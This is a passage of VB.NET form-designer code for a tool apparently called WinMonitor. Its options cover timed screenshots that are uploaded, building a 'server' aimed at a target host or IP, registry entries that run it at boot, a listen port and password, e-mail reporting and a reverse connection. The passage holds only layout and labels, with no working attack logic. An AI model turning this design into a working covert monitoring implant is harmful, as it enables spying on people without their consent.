        Me.txtScreenMonitorIntervalsMinitues.MaxLength = 5
        Me.txtScreenMonitorIntervalsMinitues.Name = "txtScreenMonitorIntervalsMinitues"
        Me.txtScreenMonitorIntervalsMinitues.Size = New System.Drawing.Size(64, 21)
        Me.txtScreenMonitorIntervalsMinitues.TabIndex = 9
        Me.txtScreenMonitorIntervalsMinitues.Text = "1"
        Me.txtScreenMonitorIntervalsMinitues.TextAlign = System.Windows.Forms.HorizontalAlignment.Right
        '
        'txtScreenMonitorIntervalsSeconds
        '
        Me.txtScreenMonitorIntervalsSeconds.BackColor = System.Drawing.SystemColors.Window
        Me.txtScreenMonitorIntervalsSeconds.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtScreenMonitorIntervalsSeconds.Location = New System.Drawing.Point(142, 34)
        Me.txtScreenMonitorIntervalsSeconds.MaxLength = 5
        Me.txtScreenMonitorIntervalsSeconds.Name = "txtScreenMonitorIntervalsSeconds"
        Me.txtScreenMonitorIntervalsSeconds.Size = New System.Drawing.Size(64, 21)
        Me.txtScreenMonitorIntervalsSeconds.TabIndex = 7
        Me.txtScreenMonitorIntervalsSeconds.Text = ""
        Me.txtScreenMonitorIntervalsSeconds.TextAlign = System.Windows.Forms.HorizontalAlignment.Right
        '
        'rdobtnScreenMonitorIntervalsHours
        '
        Me.rdobtnScreenMonitorIntervalsHours.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnScreenMonitorIntervalsHours.Location = New System.Drawing.Point(14, 122)
        Me.rdobtnScreenMonitorIntervalsHours.Name = "rdobtnScreenMonitorIntervalsHours"
        Me.rdobtnScreenMonitorIntervalsHours.Size = New System.Drawing.Size(256, 24)
        Me.rdobtnScreenMonitorIntervalsHours.TabIndex = 10
        Me.rdobtnScreenMonitorIntervalsHours.Text = "Take pictures in every                         &Hours."
        '
        'rdobtnScreenMonitorIntervalsMinitues
        '
        Me.rdobtnScreenMonitorIntervalsMinitues.Checked = True
        Me.rdobtnScreenMonitorIntervalsMinitues.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnScreenMonitorIntervalsMinitues.Location = New System.Drawing.Point(14, 76)
        Me.rdobtnScreenMonitorIntervalsMinitues.Name = "rdobtnScreenMonitorIntervalsMinitues"
        Me.rdobtnScreenMonitorIntervalsMinitues.Size = New System.Drawing.Size(260, 24)
        Me.rdobtnScreenMonitorIntervalsMinitues.TabIndex = 8
        Me.rdobtnScreenMonitorIntervalsMinitues.TabStop = True
        Me.rdobtnScreenMonitorIntervalsMinitues.Text = "Take pictures in every                         M&initues."
        '
        'rdobtnScreenMonitorIntervalsSeconds
        '
        Me.rdobtnScreenMonitorIntervalsSeconds.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnScreenMonitorIntervalsSeconds.Location = New System.Drawing.Point(14, 32)
        Me.rdobtnScreenMonitorIntervalsSeconds.Name = "rdobtnScreenMonitorIntervalsSeconds"
        Me.rdobtnScreenMonitorIntervalsSeconds.Size = New System.Drawing.Size(264, 24)
        Me.rdobtnScreenMonitorIntervalsSeconds.TabIndex = 6
        Me.rdobtnScreenMonitorIntervalsSeconds.Text = "Take pictures in every                         s&econds."
        '
        'lblPictureLmt2
        '
        Me.lblPictureLmt2.Location = New System.Drawing.Point(244, 56)
        Me.lblPictureLmt2.Name = "lblPictureLmt2"
        Me.lblPictureLmt2.Size = New System.Drawing.Size(126, 21)
        Me.lblPictureLmt2.TabIndex = 4
        Me.lblPictureLmt2.Text = "in number, upload them."
        Me.lblPictureLmt2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'txtPictureLmt
        '
        Me.txtPictureLmt.BackColor = System.Drawing.SystemColors.Window
        Me.txtPictureLmt.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtPictureLmt.Location = New System.Drawing.Point(140, 56)
        Me.txtPictureLmt.MaxLength = 4
        Me.txtPictureLmt.Name = "txtPictureLmt"
        Me.txtPictureLmt.Size = New System.Drawing.Size(102, 21)
        Me.txtPictureLmt.TabIndex = 3
        Me.txtPictureLmt.Text = ""
        Me.txtPictureLmt.TextAlign = System.Windows.Forms.HorizontalAlignment.Right
        '
        'lblPictureLmt1
        '
        Me.lblPictureLmt1.Location = New System.Drawing.Point(8, 56)
        Me.lblPictureLmt1.Name = "lblPictureLmt1"
        Me.lblPictureLmt1.Size = New System.Drawing.Size(132, 21)
        Me.lblPictureLmt1.TabIndex = 2
        Me.lblPictureLmt1.Text = "When saved files crosses"
        Me.lblPictureLmt1.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'txtScreenMonitorDirName
        '
        Me.txtScreenMonitorDirName.BackColor = System.Drawing.SystemColors.Window
        Me.txtScreenMonitorDirName.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtScreenMonitorDirName.Location = New System.Drawing.Point(140, 18)
        Me.txtScreenMonitorDirName.MaxLength = 9000
        Me.txtScreenMonitorDirName.Name = "txtScreenMonitorDirName"
        Me.txtScreenMonitorDirName.Size = New System.Drawing.Size(230, 21)
        Me.txtScreenMonitorDirName.TabIndex = 1
        Me.txtScreenMonitorDirName.Text = ""
        '
        'lblScreenMonitorDirName
        '
        Me.lblScreenMonitorDirName.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblScreenMonitorDirName.Location = New System.Drawing.Point(8, 16)
        Me.lblScreenMonitorDirName.Name = "lblScreenMonitorDirName"
        Me.lblScreenMonitorDirName.Size = New System.Drawing.Size(132, 21)
        Me.lblScreenMonitorDirName.TabIndex = 0
        Me.lblScreenMonitorDirName.Text = "Picture Directory Name"
        Me.lblScreenMonitorDirName.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'tabpgeWinMonitorServerOptions
        '
        Me.tabpgeWinMonitorServerOptions.Controls.AddRange(New System.Windows.Forms.Control() {Me.gbxWinMonitorOptions})
        Me.tabpgeWinMonitorServerOptions.Location = New System.Drawing.Point(4, 25)
        Me.tabpgeWinMonitorServerOptions.Name = "tabpgeWinMonitorServerOptions"
        Me.tabpgeWinMonitorServerOptions.Size = New System.Drawing.Size(499, 274)
        Me.tabpgeWinMonitorServerOptions.TabIndex = 2
        Me.tabpgeWinMonitorServerOptions.Text = "WinMonitor Server Options"
        '
        'gbxWinMonitorOptions
        '
        Me.gbxWinMonitorOptions.Controls.AddRange(New System.Windows.Forms.Control() {Me.btnWinMonitorNameAdvancedOptions, Me.btnWinMonitorBuild, Me.gbxWinMonitorRegisterLocations, Me.txtWinMonitorTargetedHostName, Me.lblWinMonitorTargetedHostName, Me.btnWinMonitorSaveDir, Me.txtWinMonitorSaveDir, Me.lblWinMonitorSaveDir, Me.txtWinMonitorRegKeyName, Me.lblWinMonitorRegKeyName, Me.txtWinMonitorInternalName, Me.lblWinMonitorInternalName})
        Me.gbxWinMonitorOptions.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.gbxWinMonitorOptions.ForeColor = System.Drawing.Color.Black
        Me.gbxWinMonitorOptions.Name = "gbxWinMonitorOptions"
        Me.gbxWinMonitorOptions.Size = New System.Drawing.Size(498, 272)
        Me.gbxWinMonitorOptions.TabIndex = 4
        Me.gbxWinMonitorOptions.TabStop = False
        '
        'btnWinMonitorNameAdvancedOptions
        '
        Me.btnWinMonitorNameAdvancedOptions.BackColor = System.Drawing.SystemColors.Control
        Me.btnWinMonitorNameAdvancedOptions.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnWinMonitorNameAdvancedOptions.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnWinMonitorNameAdvancedOptions.Location = New System.Drawing.Point(402, 18)
        Me.btnWinMonitorNameAdvancedOptions.Name = "btnWinMonitorNameAdvancedOptions"
        Me.btnWinMonitorNameAdvancedOptions.Size = New System.Drawing.Size(88, 20)
        Me.btnWinMonitorNameAdvancedOptions.TabIndex = 15
        Me.btnWinMonitorNameAdvancedOptions.Text = "&Extra Options"
        '
        'btnWinMonitorBuild
        '
        Me.btnWinMonitorBuild.BackColor = System.Drawing.SystemColors.Control
        Me.btnWinMonitorBuild.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnWinMonitorBuild.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnWinMonitorBuild.ForeColor = System.Drawing.Color.Navy
        Me.btnWinMonitorBuild.Image = CType(resources.GetObject("btnWinMonitorBuild.Image"), System.Drawing.Bitmap)
        Me.btnWinMonitorBuild.ImageAlign = System.Drawing.ContentAlignment.TopLeft
        Me.btnWinMonitorBuild.Location = New System.Drawing.Point(402, 98)
        Me.btnWinMonitorBuild.Name = "btnWinMonitorBuild"
        Me.btnWinMonitorBuild.Size = New System.Drawing.Size(88, 46)
        Me.btnWinMonitorBuild.TabIndex = 10
        Me.btnWinMonitorBuild.Text = "Build &WinMonitor !"
        '
        'gbxWinMonitorRegisterLocations
        '
        Me.gbxWinMonitorRegisterLocations.Controls.AddRange(New System.Windows.Forms.Control() {Me.gbxWinMonitorHKEY_LOCAL_USER, Me.line8, Me.line6, Me.line5, Me.line4, Me.gbxWinMonitorHKEY_LOCAL_MACHINE, Me.line3, Me.line1, Me.lblWinMonitorHKEY_LOCAL_USER, Me.lblWinMonitorHKEY_LOCAL_MACHINE})
        Me.gbxWinMonitorRegisterLocations.Location = New System.Drawing.Point(8, 158)
        Me.gbxWinMonitorRegisterLocations.Name = "gbxWinMonitorRegisterLocations"
        Me.gbxWinMonitorRegisterLocations.Size = New System.Drawing.Size(482, 106)
        Me.gbxWinMonitorRegisterLocations.TabIndex = 9
        Me.gbxWinMonitorRegisterLocations.TabStop = False
        Me.gbxWinMonitorRegisterLocations.Text = "[ Registry Settings]"
        '
        'gbxWinMonitorHKEY_LOCAL_USER
        '
        Me.gbxWinMonitorHKEY_LOCAL_USER.Controls.AddRange(New System.Windows.Forms.Control() {Me.rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways})
        Me.gbxWinMonitorHKEY_LOCAL_USER.Location = New System.Drawing.Point(160, 54)
        Me.gbxWinMonitorHKEY_LOCAL_USER.Name = "gbxWinMonitorHKEY_LOCAL_USER"
        Me.gbxWinMonitorHKEY_LOCAL_USER.Size = New System.Drawing.Size(150, 32)
        Me.gbxWinMonitorHKEY_LOCAL_USER.TabIndex = 12
        Me.gbxWinMonitorHKEY_LOCAL_USER.TabStop = False
        '
        'rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways
        '
        Me.rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways.Location = New System.Drawing.Point(6, 10)
        Me.rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways.Name = "rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways"
        Me.rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways.Size = New System.Drawing.Size(142, 16)
        Me.rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways.TabIndex = 8
        Me.rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways.Text = "Run always at boot up"
        '
        'line8
        '
        Me.line8.BackColor = System.Drawing.Color.Gray
        Me.line8.Location = New System.Drawing.Point(130, 72)
        Me.line8.Name = "line8"
        Me.line8.Size = New System.Drawing.Size(36, 3)
        Me.line8.TabIndex = 11
        '
        'line6
        '
        Me.line6.BackColor = System.Drawing.Color.Gray
        Me.line6.Location = New System.Drawing.Point(312, 92)
        Me.line6.Name = "line6"
        Me.line6.Size = New System.Drawing.Size(18, 3)
        Me.line6.TabIndex = 10
        '
        'line5
        '
        Me.line5.BackColor = System.Drawing.Color.Gray
        Me.line5.Location = New System.Drawing.Point(312, 16)
        Me.line5.Name = "line5"
        Me.line5.Size = New System.Drawing.Size(18, 3)
        Me.line5.TabIndex = 9
        '
        'line4
        '
        Me.line4.BackColor = System.Drawing.Color.Gray
        Me.line4.Location = New System.Drawing.Point(312, 18)
        Me.line4.Name = "line4"
        Me.line4.Size = New System.Drawing.Size(3, 76)
        Me.line4.TabIndex = 8
        '
        'gbxWinMonitorHKEY_LOCAL_MACHINE
        '
        Me.gbxWinMonitorHKEY_LOCAL_MACHINE.Controls.AddRange(New System.Windows.Forms.Control() {Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways, Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce})
        Me.gbxWinMonitorHKEY_LOCAL_MACHINE.Location = New System.Drawing.Point(314, 12)
        Me.gbxWinMonitorHKEY_LOCAL_MACHINE.Name = "gbxWinMonitorHKEY_LOCAL_MACHINE"
        Me.gbxWinMonitorHKEY_LOCAL_MACHINE.Size = New System.Drawing.Size(160, 82)
        Me.gbxWinMonitorHKEY_LOCAL_MACHINE.TabIndex = 5
        Me.gbxWinMonitorHKEY_LOCAL_MACHINE.TabStop = False
        '
        'rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways
        '
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways.Location = New System.Drawing.Point(8, 47)
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways.Name = "rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways"
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways.Size = New System.Drawing.Size(144, 20)
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways.TabIndex = 3
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunAlways.Text = "Run &always at boot up"
        '
        'rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce
        '
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce.Location = New System.Drawing.Point(8, 15)
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce.Name = "rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce"
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce.Size = New System.Drawing.Size(144, 20)
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce.TabIndex = 2
        Me.rdobtnWinMonitorHKEY_LOCAL_MACHINE_RunOnce.Text = "Run once"
        '
        'line3
        '
        Me.line3.BackColor = System.Drawing.Color.Gray
        Me.line3.ForeColor = System.Drawing.Color.DimGray
        Me.line3.Location = New System.Drawing.Point(202, 40)
        Me.line3.Name = "line3"
        Me.line3.Size = New System.Drawing.Size(110, 3)
        Me.line3.TabIndex = 4
        '
        'line1
        '
        Me.line1.BackColor = System.Drawing.Color.Gray
        Me.line1.Location = New System.Drawing.Point(148, 40)
        Me.line1.Name = "line1"
        Me.line1.Size = New System.Drawing.Size(54, 3)
        Me.line1.TabIndex = 2
        '
        'lblWinMonitorHKEY_LOCAL_USER
        '
        Me.lblWinMonitorHKEY_LOCAL_USER.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblWinMonitorHKEY_LOCAL_USER.ForeColor = System.Drawing.Color.Black
        Me.lblWinMonitorHKEY_LOCAL_USER.Location = New System.Drawing.Point(8, 64)
        Me.lblWinMonitorHKEY_LOCAL_USER.Name = "lblWinMonitorHKEY_LOCAL_USER"
        Me.lblWinMonitorHKEY_LOCAL_USER.Size = New System.Drawing.Size(122, 20)
        Me.lblWinMonitorHKEY_LOCAL_USER.TabIndex = 1
        Me.lblWinMonitorHKEY_LOCAL_USER.Text = "Hkey Local User"
        Me.lblWinMonitorHKEY_LOCAL_USER.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'lblWinMonitorHKEY_LOCAL_MACHINE
        '
        Me.lblWinMonitorHKEY_LOCAL_MACHINE.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblWinMonitorHKEY_LOCAL_MACHINE.ForeColor = System.Drawing.Color.Black
        Me.lblWinMonitorHKEY_LOCAL_MACHINE.Location = New System.Drawing.Point(8, 30)
        Me.lblWinMonitorHKEY_LOCAL_MACHINE.Name = "lblWinMonitorHKEY_LOCAL_MACHINE"
        Me.lblWinMonitorHKEY_LOCAL_MACHINE.Size = New System.Drawing.Size(140, 22)
        Me.lblWinMonitorHKEY_LOCAL_MACHINE.TabIndex = 0
        Me.lblWinMonitorHKEY_LOCAL_MACHINE.Text = "Hkey Local Machine"
        Me.lblWinMonitorHKEY_LOCAL_MACHINE.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'txtWinMonitorTargetedHostName
        '
        Me.txtWinMonitorTargetedHostName.BackColor = System.Drawing.SystemColors.Window
        Me.txtWinMonitorTargetedHostName.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtWinMonitorTargetedHostName.Location = New System.Drawing.Point(136, 123)
        Me.txtWinMonitorTargetedHostName.MaxLength = 25
        Me.txtWinMonitorTargetedHostName.Name = "txtWinMonitorTargetedHostName"
        Me.txtWinMonitorTargetedHostName.Size = New System.Drawing.Size(260, 21)
        Me.txtWinMonitorTargetedHostName.TabIndex = 8
        Me.txtWinMonitorTargetedHostName.Text = ""
        '
        'lblWinMonitorTargetedHostName
        '
        Me.lblWinMonitorTargetedHostName.Location = New System.Drawing.Point(4, 124)
        Me.lblWinMonitorTargetedHostName.Name = "lblWinMonitorTargetedHostName"
        Me.lblWinMonitorTargetedHostName.Size = New System.Drawing.Size(130, 21)
        Me.lblWinMonitorTargetedHostName.TabIndex = 7
        Me.lblWinMonitorTargetedHostName.Text = "Targeted host name/IP"
        Me.lblWinMonitorTargetedHostName.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'btnWinMonitorSaveDir
        '
        Me.btnWinMonitorSaveDir.BackColor = System.Drawing.SystemColors.Control
        Me.btnWinMonitorSaveDir.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnWinMonitorSaveDir.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnWinMonitorSaveDir.Image = CType(resources.GetObject("btnWinMonitorSaveDir.Image"), System.Drawing.Bitmap)
        Me.btnWinMonitorSaveDir.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnWinMonitorSaveDir.Location = New System.Drawing.Point(402, 52)
        Me.btnWinMonitorSaveDir.Name = "btnWinMonitorSaveDir"
        Me.btnWinMonitorSaveDir.Size = New System.Drawing.Size(88, 20)
        Me.btnWinMonitorSaveDir.TabIndex = 6
        Me.btnWinMonitorSaveDir.Text = "&Browse..."
        '
        'txtWinMonitorSaveDir
        '
        Me.txtWinMonitorSaveDir.BackColor = System.Drawing.SystemColors.Window
        Me.txtWinMonitorSaveDir.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtWinMonitorSaveDir.Location = New System.Drawing.Point(136, 53)
        Me.txtWinMonitorSaveDir.MaxLength = 9000
        Me.txtWinMonitorSaveDir.Name = "txtWinMonitorSaveDir"
        Me.txtWinMonitorSaveDir.Size = New System.Drawing.Size(260, 21)
        Me.txtWinMonitorSaveDir.TabIndex = 5
        Me.txtWinMonitorSaveDir.Text = ""
        '
        'lblWinMonitorSaveDir
        '
        Me.lblWinMonitorSaveDir.Location = New System.Drawing.Point(10, 52)
        Me.lblWinMonitorSaveDir.Name = "lblWinMonitorSaveDir"
        Me.lblWinMonitorSaveDir.Size = New System.Drawing.Size(124, 21)
        Me.lblWinMonitorSaveDir.TabIndex = 4
        Me.lblWinMonitorSaveDir.Text = "Server Setup save Dir."
        Me.lblWinMonitorSaveDir.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'txtWinMonitorRegKeyName
        '
        Me.txtWinMonitorRegKeyName.BackColor = System.Drawing.SystemColors.Window
        Me.txtWinMonitorRegKeyName.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtWinMonitorRegKeyName.Location = New System.Drawing.Point(136, 88)
        Me.txtWinMonitorRegKeyName.MaxLength = 25
        Me.txtWinMonitorRegKeyName.Name = "txtWinMonitorRegKeyName"
        Me.txtWinMonitorRegKeyName.Size = New System.Drawing.Size(260, 21)
        Me.txtWinMonitorRegKeyName.TabIndex = 3
        Me.txtWinMonitorRegKeyName.Text = ""
        '
        'lblWinMonitorRegKeyName
        '
        Me.lblWinMonitorRegKeyName.Location = New System.Drawing.Point(4, 88)
        Me.lblWinMonitorRegKeyName.Name = "lblWinMonitorRegKeyName"
        Me.lblWinMonitorRegKeyName.Size = New System.Drawing.Size(130, 21)
        Me.lblWinMonitorRegKeyName.TabIndex = 2
        Me.lblWinMonitorRegKeyName.Text = "Register Key name"
        Me.lblWinMonitorRegKeyName.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'txtWinMonitorInternalName
        '
        Me.txtWinMonitorInternalName.BackColor = System.Drawing.SystemColors.Window
        Me.txtWinMonitorInternalName.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtWinMonitorInternalName.Location = New System.Drawing.Point(136, 18)
        Me.txtWinMonitorInternalName.MaxLength = 25
        Me.txtWinMonitorInternalName.Name = "txtWinMonitorInternalName"
        Me.txtWinMonitorInternalName.Size = New System.Drawing.Size(260, 21)
        Me.txtWinMonitorInternalName.TabIndex = 1
        Me.txtWinMonitorInternalName.Text = ""
        '
        'lblWinMonitorInternalName
        '
        Me.lblWinMonitorInternalName.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblWinMonitorInternalName.Location = New System.Drawing.Point(14, 16)
        Me.lblWinMonitorInternalName.Name = "lblWinMonitorInternalName"
        Me.lblWinMonitorInternalName.Size = New System.Drawing.Size(130, 21)
        Me.lblWinMonitorInternalName.TabIndex = 0
        Me.lblWinMonitorInternalName.Text = "WinMonitor Server name"
        Me.lblWinMonitorInternalName.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'tabpgeNetworkMonitorOptions
        '
        Me.tabpgeNetworkMonitorOptions.Controls.AddRange(New System.Windows.Forms.Control() {Me.gbxNetworkMonitorOptions})
        Me.tabpgeNetworkMonitorOptions.Location = New System.Drawing.Point(4, 25)
        Me.tabpgeNetworkMonitorOptions.Name = "tabpgeNetworkMonitorOptions"
        Me.tabpgeNetworkMonitorOptions.Size = New System.Drawing.Size(499, 274)
        Me.tabpgeNetworkMonitorOptions.TabIndex = 3
        Me.tabpgeNetworkMonitorOptions.Text = "Network Monitor Options"
        '
        'gbxNetworkMonitorOptions
        '
        Me.gbxNetworkMonitorOptions.Controls.AddRange(New System.Windows.Forms.Control() {Me.lblNwMonitorEmailServer, Me.txtNwMonitorEmailServer, Me.chkboxNwMonitorEmail, Me.txtNwMonitorEmail, Me.lblNwMonitorEmail, Me.pbxNwMonitorIcon, Me.gbxNwMonitorReverseConnection, Me.lblNwMonitorRePassword, Me.txtNwMonitorRePassword, Me.lblNwMonitorPassword, Me.txtNwMonitorPassword, Me.lblNwMonitorListenPort2, Me.txtNwMonitorListenPort, Me.lblNwMonitorListenPort1})
        Me.gbxNetworkMonitorOptions.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.gbxNetworkMonitorOptions.ForeColor = System.Drawing.Color.Black
        Me.gbxNetworkMonitorOptions.Name = "gbxNetworkMonitorOptions"
        Me.gbxNetworkMonitorOptions.Size = New System.Drawing.Size(498, 272)
        Me.gbxNetworkMonitorOptions.TabIndex = 4
        Me.gbxNetworkMonitorOptions.TabStop = False
        '
        'lblNwMonitorEmailServer
        '
        Me.lblNwMonitorEmailServer.Location = New System.Drawing.Point(94, 122)
        Me.lblNwMonitorEmailServer.Name = "lblNwMonitorEmailServer"
        Me.lblNwMonitorEmailServer.Size = New System.Drawing.Size(96, 26)
        Me.lblNwMonitorEmailServer.TabIndex = 19
        Me.lblNwMonitorEmailServer.Text = "E-Mail Server"
        Me.lblNwMonitorEmailServer.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'txtNwMonitorEmailServer
        '
        Me.txtNwMonitorEmailServer.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtNwMonitorEmailServer.Location = New System.Drawing.Point(200, 126)
        Me.txtNwMonitorEmailServer.MaxLength = 50
        Me.txtNwMonitorEmailServer.Name = "txtNwMonitorEmailServer"
        Me.txtNwMonitorEmailServer.Size = New System.Drawing.Size(232, 21)
        Me.txtNwMonitorEmailServer.TabIndex = 18
        Me.txtNwMonitorEmailServer.Text = ""
        '
        'chkboxNwMonitorEmail
        '
        Me.chkboxNwMonitorEmail.Location = New System.Drawing.Point(16, 98)
        Me.chkboxNwMonitorEmail.Name = "chkboxNwMonitorEmail"
        Me.chkboxNwMonitorEmail.Size = New System.Drawing.Size(120, 26)
        Me.chkboxNwMonitorEmail.TabIndex = 17
        Me.chkboxNwMonitorEmail.Text = "Enable E-Mailing"
        '
        'txtNwMonitorEmail
        '
        Me.txtNwMonitorEmail.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtNwMonitorEmail.Location = New System.Drawing.Point(200, 100)
        Me.txtNwMonitorEmail.MaxLength = 50
        Me.txtNwMonitorEmail.Name = "txtNwMonitorEmail"
        Me.txtNwMonitorEmail.Size = New System.Drawing.Size(232, 21)
        Me.txtNwMonitorEmail.TabIndex = 16
        Me.txtNwMonitorEmail.Text = ""
        '
        'lblNwMonitorEmail
        '
        Me.lblNwMonitorEmail.Location = New System.Drawing.Point(94, 98)
        Me.lblNwMonitorEmail.Name = "lblNwMonitorEmail"
        Me.lblNwMonitorEmail.Size = New System.Drawing.Size(96, 26)
        Me.lblNwMonitorEmail.TabIndex = 15
        Me.lblNwMonitorEmail.Text = "E-Mail"
        Me.lblNwMonitorEmail.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'pbxNwMonitorIcon
        '
        Me.pbxNwMonitorIcon.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.pbxNwMonitorIcon.Image = CType(resources.GetObject("pbxNwMonitorIcon.Image"), System.Drawing.Bitmap)
        Me.pbxNwMonitorIcon.Location = New System.Drawing.Point(14, 16)
        Me.pbxNwMonitorIcon.Name = "pbxNwMonitorIcon"
        Me.pbxNwMonitorIcon.Size = New System.Drawing.Size(80, 72)
        Me.pbxNwMonitorIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage
        Me.pbxNwMonitorIcon.TabIndex = 14
        Me.pbxNwMonitorIcon.TabStop = False
        '
        'gbxNwMonitorReverseConnection
        '
        Me.gbxNwMonitorReverseConnection.Controls.AddRange(New System.Windows.Forms.Control() {Me.rdobtnReverseConnectionDisable, Me.rdobtnReverseConnectionEnable, Me.lblNwMonitorReverseConnectionAttempt2, Me.lblNwMonitorReverseConnectionPort2, Me.txtNwMonitorReverseConnectionIP, Me.txtNwMonitorReverseConnectionAttempt, Me.txtNwMonitorReverseConnectionPort, Me.lblNwMonitorReverseConnectionAttempt1, Me.lblNwMonitorReverseConnectionPort1, Me.lblNwMonitorReverseConnectionIP})
        Me.gbxNwMonitorReverseConnection.Location = New System.Drawing.Point(8, 156)
        Me.gbxNwMonitorReverseConnection.Name = "gbxNwMonitorReverseConnection"
        Me.gbxNwMonitorReverseConnection.Size = New System.Drawing.Size(482, 108)
        Me.gbxNwMonitorReverseConnection.TabIndex = 13
        Me.gbxNwMonitorReverseConnection.TabStop = False
        '
        'rdobtnReverseConnectionDisable
        '
        Me.rdobtnReverseConnectionDisable.Checked = True
        Me.rdobtnReverseConnectionDisable.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnReverseConnectionDisable.Location = New System.Drawing.Point(172, 12)
        Me.rdobtnReverseConnectionDisable.Name = "rdobtnReverseConnectionDisable"
        Me.rdobtnReverseConnectionDisable.Size = New System.Drawing.Size(166, 16)
        Me.rdobtnReverseConnectionDisable.TabIndex = 20
        Me.rdobtnReverseConnectionDisable.TabStop = True
        Me.rdobtnReverseConnectionDisable.Text = "Disable Reverse Connection"
        '
        'rdobtnReverseConnectionEnable
        '
        Me.rdobtnReverseConnectionEnable.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.rdobtnReverseConnectionEnable.Location = New System.Drawing.Point(6, 12)
        Me.rdobtnReverseConnectionEnable.Name = "rdobtnReverseConnectionEnable"
        Me.rdobtnReverseConnectionEnable.Size = New System.Drawing.Size(166, 16)
        Me.rdobtnReverseConnectionEnable.TabIndex = 19
        Me.rdobtnReverseConnectionEnable.Text = "Enable Reverse Connection"
        '
        'lblNwMonitorReverseConnectionAttempt2
        '
        Me.lblNwMonitorReverseConnectionAttempt2.Location = New System.Drawing.Point(323, 78)
